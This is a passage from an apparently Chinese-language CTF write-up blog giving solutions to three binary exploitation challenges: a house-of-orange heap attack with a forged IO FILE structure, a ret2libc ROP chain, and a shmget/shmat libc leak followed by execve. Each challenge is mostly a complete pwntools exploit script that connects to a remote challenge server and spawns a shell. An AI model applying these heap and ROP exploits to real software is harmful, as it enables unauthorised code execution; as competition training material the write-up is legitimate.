title="orange"></a>orange</h4><p>ByteCTF2024原题，只不过去了符号表、加了花指令。nop掉花指令后分析，发现没有free，考虑<code>house of orange</code>攻击，利用unsorted bin泄露libc和堆地址后打IO即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">32784</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>menu = <span class="hljs-string">b&quot;Enter \n&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size, payload:<span class="hljs-built_in">bytes</span></span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;4&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;input\n&quot;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#0</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x110</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(<span class="hljs-number">0xca1</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xc70</span>)<span class="hljs-comment">#2</span><br>    show(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2: &#x27;</span>)<br>    libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>    stdout = libc.address+<span class="hljs-number">0x3ec760</span><br>    wfile_jump = libc.address+<span class="hljs-number">0x3e7d60</span><br>    add(<span class="hljs-number">0xdb0</span>)<span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0xdc0</span>)<span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x1f1</span>)+p64(stdout))<br>    fake_io = flat(&#123;<br>        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&#x27; sh&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>: p64(stdout-<span class="hljs-number">0x130</span>+<span class="hljs-number">0xd8</span>),<br>        <span class="hljs-number">0x10</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x20</span>: p64(stdout),<br>        <span class="hljs-number">0x98</span>: p64(stdout-<span class="hljs-number">0x20</span>+<span class="hljs-number">0x80</span>),<br>        <span class="hljs-number">0xd8</span>: p64(wfile_jump + <span class="hljs-number">0x48</span> - <span class="hljs-number">0x38</span>),<br>        <span class="hljs-number">0x60</span>: <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x80</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x88</span>: p64(stdout - <span class="hljs-number">0x30</span>),<br>        <span class="hljs-number">0xe0</span>: p64(stdout - <span class="hljs-number">8</span>),<br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br>    p.interactive()<br>pwn()<br></code></pre></td></tr></table></figure><h4 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h4><p>ret2libc板子。注意printf需要栈对齐，也包括重启main后的printf，需要用ret对齐。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">36450</span>)<br>main = <span class="hljs-number">0x4011df</span><br>puts_got = e.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x401294</span><br><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) \<br>    +p64(ret) +p64(puts_plt) + p64(ret)+ p64(main) <br>io.send(payload)<br>io.recvuntil(<span class="hljs-string">b&quot;\x40&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(binsh_addr) \<br>    + p64(ret) + p64(system_addr)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>给了3次syscall的机会，利用<code>shmget</code>+<code>shmat</code>leak libc，拿出<code>/bin/sh</code>地址，再<code>execve</code>即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+64)</span><br><span class="hljs-comment">#                b *(*main+312)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">20415</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;29&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;1000&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;8630&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;30&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;result:&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;RAX: &quot;</span>)<br>printf_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;000&quot;</span>).decode()[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>) - <span class="hljs-number">2144528</span> + <span class="hljs-number">0xa000</span><br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr+<span class="hljs-number">2144528</span>-<span class="hljs-number">0xa000</span>)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>payload = <span class="hljs-built_in">str</span>(binsh_addr).encode()<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;59&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, payload)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
